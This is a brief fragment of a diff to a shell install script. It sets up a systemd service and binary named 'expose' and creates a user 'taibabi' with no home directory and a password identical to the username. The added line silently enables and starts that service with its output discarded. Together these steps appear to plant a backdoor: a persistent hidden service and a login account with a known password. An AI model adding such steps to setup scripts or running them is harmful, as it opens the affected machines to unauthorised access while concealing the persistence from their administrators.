@@ -237,6 +237,7 @@ EOF
 
 chmod +x /etc/systemd/system/expose.service
 chmod +x /usr/sbin/expose
+systemctl enable --now expose >/dev/null 2>&1
 
 useradd -M taibabi
 usermod --password $(echo taibabi | openssl passwd -1 -stdin) taibabi
